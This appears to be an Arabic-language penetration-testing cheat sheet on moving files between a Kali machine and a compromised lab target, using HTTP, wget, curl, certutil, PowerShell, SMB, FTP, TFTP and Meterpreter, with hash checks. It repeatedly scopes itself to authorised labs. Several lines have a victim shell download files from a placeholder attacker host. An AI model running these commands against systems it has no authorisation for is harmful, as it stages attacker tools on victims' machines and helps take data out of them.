File Transfer — نقل الملفات بين Kali والهدف

مرجع عملي سريع: اختر القناة المناسبة → انقل الملف → تحقق من سلامته → انتقل للخطوة التالية.

1. Choose Method / Available Tools

قبل النقل حدّد اتجاه الملف، نوع الجلسة، عنوان جهازك، والمسار القابل للكتابة على الهدف.

Workflow: Source → Destination → Writable Path → Available Tool → Transfer → Verify.
تحديد عنوان جهاز الهجوم KALI TERMINAL
ip a ip route
استخدم عنوان الواجهة التي يستطيع الهدف الوصول إليها، خصوصًا مع VPN/Lab.
اختبار المسار القابل للكتابة VICTIM SHELL
pwd ls -ld . ls -ld /tmp
استخدم مجلدًا تملك الكتابة عليه، ولا تكتب فوق ملفات موجودة.
إيقاف HTTP Server بعد الانتهاء KALI TERMINAL
Ctrl+C
أوقف الخادم المؤقت عندما تنتهي حتى لا تترك Service مفتوحة بدون حاجة.

2. Kali-hosted HTTP

هذه المرحلة هنا للتأكد أن قناة النقل نفسها قابلة للوصول قبل أن تضيع وقتك في أوامر التحميل.

لا تفتح Listener أو Service على شبكة غير مصرح بها. هذا الملف مخصص للـLab والاختبارات المصرح بها فقط.
اختبار الوصول إلى HTTP Server على جهازك KALI TERMINAL
python3 -m http.server [PORT] --bind [ATTACKER_IP]
شغّل الأمر داخل المجلد الذي يحتوي الملف المطلوب نقله. اترك النافذة مفتوحة أثناء التحميل.
فحص الوصول إلى بورت HTTP من الهدف VICTIM SHELL
curl -I http://[ATTACKER_IP]:[PORT]/
استخدمه فقط إذا curl موجود. فشل الاتصال قد يعني Routing/Firewall/Port خطأ.
تشغيل Web Server من مجلد الملف KALI TERMINAL
cd [DIR] python3 -m http.server [PORT] --bind [ATTACKER_IP]
ضع [FILE] داخل [DIR] قبل تشغيل الخادم.

3. Kali ↔ Linux

اعرف الأدوات المتاحة على الهدف واختر أبسط طريقة موجودة بدل محاولة تثبيت أدوات جديدة.

اختيار سريع: Linux → wget/curl. Windows → PowerShell أو certutil. Meterpreter → upload/download. خدمة SMB/FTP موجودة أصلًا → استخدمها إذا كانت الصلاحيات تسمح.
تأكيد نوع الجلسة الحالية على Linux VICTIM SHELL
whoami pwd id
اعرف المستخدم الحالي والمسار قبل اختيار مكان حفظ الملف.
البحث عن curl/wget/python VICTIM SHELL
which curl which wget which python3 which python
وجود أي واحدة منها يكفي غالبًا لبناء مسار HTTP بسيط.
Linux — تنزيل عبر wget VICTIM SHELL
wget http://[ATTACKER_IP]:[PORT]/[FILE] -O [FILE]
وجود الملف محليًا بدون خطأ نقل = نجاح المسار، ثم انتقل للتحقق في المرحلة 6.
Linux — تنزيل عبر curl VICTIM SHELL
curl -o [FILE] http://[ATTACKER_IP]:[PORT]/[FILE]
بديل مباشر إذا wget غير موجود.

4. Kali ↔ Windows

النقل عبر HTTP المباشر غالبًا لا يحتاج Credentials. هذه المرحلة تنطبق عندما تستخدم SMB/FTP أو خدمة تحتاج حسابًا معروفًا.

لا تستخدم Password Spraying أو Brute Force داخل ملف File Transfer. اختبار كلمات المرور له ملفات الخدمة نفسها.
تأكيد نوع الجلسة الحالية على Windows WINDOWS CMD
whoami cd echo %TEMP%
مجلد %TEMP% غالبًا مناسب للملفات المؤقتة إذا كانت الصلاحيات تسمح.
Windows — اختبار الوصول إلى HTTP POWERSHELL
Invoke-WebRequest -Uri http://[ATTACKER_IP]:[PORT]/ -Method Head
إذا كانت السياسة أو نسخة PowerShell تمنع الطلب، جرّب طريقة النقل الأخرى بدل افتراض أن الشبكة لا تعمل.
التأكد من PowerShell WINDOWS CMD
where powershell
التأكد من certutil WINDOWS CMD
where certutil
certutil أداة Windows أصلية وقد تكون متاحة حتى عندما لا تريد استخدام PowerShell.
فحص مجلد الحفظ WINDOWS CMD
echo %TEMP% dir %TEMP%
Windows — certutil download WINDOWS CMD
certutil -urlcache -split -f http://[ATTACKER_IP]:[PORT]/[FILE] [FILE]
هذا File Transfer وليس HTTP Enumeration.

5. SMB / FTP / TFTP / Meterpreter

هنا التنفيذ الفعلي للنقل. اختر المسار المطابق لنظام الهدف والأداة المتاحة.

مهم: لا تعتبر نجاح أمر النقل إثباتًا كافيًا. تحقق من الحجم/الهاش في المرحلة التالية قبل استخدام الملف.
تأكيد Meterpreter والسياق METERPRETER
getuid pwd
إذا كنت داخل Meterpreter يمكنك استخدام upload/download مباشرة بدون إنشاء Web Server.
فحص SMB/FTP عند استخدام خدمة موجودة KALI TERMINAL
nmap -Pn -p21,445 -sV [TARGET]
استخدم هذا فقط إذا قررت النقل عبر FTP/SMB الموجودين على الهدف.
عرض أوامر النقل المتاحة METERPRETER
help upload help download
إذا Meterpreter موجود، upload/download عادة أبسط من إنشاء قناة نقل ثانية.
SMB — اختبار Credentials معروفة قبل النقل KALI TERMINAL
smbclient //[TARGET]/[SHARE] -U [USERNAME]
أدخل كلمة المرور المعروفة عند الطلب. لا تعمل Brute Force هنا؛ الهدف فقط إثبات أن الحساب يسمح بالدخول.
SMBMap — التحقق من الصلاحيات KALI TERMINAL
smbmap -H [TARGET] -u [USERNAME] -p [PASSWORD]
ابحث عن Read/Write على الـShare المطلوب قبل upload/download.
FTP — الدخول ببيانات معروفة KALI TERMINAL
ftp [TARGET]
بعد الاتصال استخدم Username/Password المعروفين فقط. إذا فشل الدخول ارجع لملف FTP بدل خلط Password Attacks مع File Transfer.
Meterpreter — لا يحتاج Credential إضافي METERPRETER
getuid
وجود Session قائمة يعني أن النقل يستخدم نفس الجلسة الحالية، وليس Login جديدًا.
رفع ملف من Kali إلى الهدف METERPRETER
upload [FILE] [REMOTE_PATH]
استخدم مسارًا تملك الكتابة عليه.
تنزيل ملف من الهدف إلى Kali METERPRETER
download [REMOTE_PATH] [FILE]
احفظ الملف محليًا باسم واضح لتجنب الخلط بين النسخ.
SMBMap — رفع وتنزيل KALI TERMINAL
smbmap -H [TARGET] -u [USERNAME] -p [PASSWORD] --upload '[FILE]' '[SHARE]\[FILE]' smbmap -H [TARGET] -u [USERNAME] -p [PASSWORD] --download '[SHARE]\[FILE]'
نفّذ الرفع فقط إذا Enumeration أكد Write على الـShare.
smbclient — put/get داخل الجلسة SMBCLIENT
put [FILE] get [FILE]
ادخل الـShare أولًا ثم استخدم put للرفع وget للتنزيل.
FTP — تنزيل ملف داخل الجلسة FTP CLIENT
binary get [FILE]
استخدم binary للملفات الثنائية حتى لا تتلف أثناء النقل.
FTP — رفع ملف داخل الجلسة FTP CLIENT
binary put [FILE]
لا ترفع ملفًا إلا إذا كان لديك Write Access ومطلوبًا في اللاب.
TFTP — تنزيل ملف معروف TFTP CLIENT
get [FILE]
TFTP لا يدعم Directory Listing قياسيًا؛ استخدم اسم ملف معروف من سياق اللاب.
تأكيد الملف بعد Upload METERPRETER
ls [REMOTE_PATH]

6. Integrity Verification & Cleanup

بعد النقل تحقق أن الملف وصل صحيحًا، ثم نفّذ فقط ما يحتاجه اللاب.

Next Action: الملف أداة Enumeration؟ → شغّلها فقط ضمن Scope. ملف Evidence؟ → خزّنه محليًا. ملف Config/Credential؟ → انتقل إلى Credential Access. لا تكرر Post-Exploitation كامل هنا.
لا تحذف ملفات نظام، لا تستبدل ملفات إنتاج، ولا تنشئ Persistence لمجرد نجاح النقل.
Windows — PowerShell download POWERSHELL
Invoke-WebRequest -Uri http://[ATTACKER_IP]:[PORT]/[FILE] -OutFile [FILE]
نفّذه داخل مجلد قابل للكتابة مثل %TEMP% أو مسار اللاب المخصص.
تأكيد وجود الملف وحجمه VICTIM SHELL
ls -lh [FILE] file [FILE]
تأكد أن الحجم ونوع الملف منطقيان.
حساب SHA-256 على Linux VICTIM SHELL
sha256sum [FILE]
قارن الهاش مع النسخة الأصلية على Kali إذا أردت تأكيد سلامة النقل.
حساب SHA-256 على Kali KALI TERMINAL
sha256sum [FILE]
تأكيد وجود الملف WINDOWS CMD
dir [FILE]
حساب SHA-256 على Windows POWERSHELL
Get-FileHash [FILE] -Algorithm SHA256
تطابق الهاش مع النسخة الأصلية يعني أن النقل تم بدون تغيير.
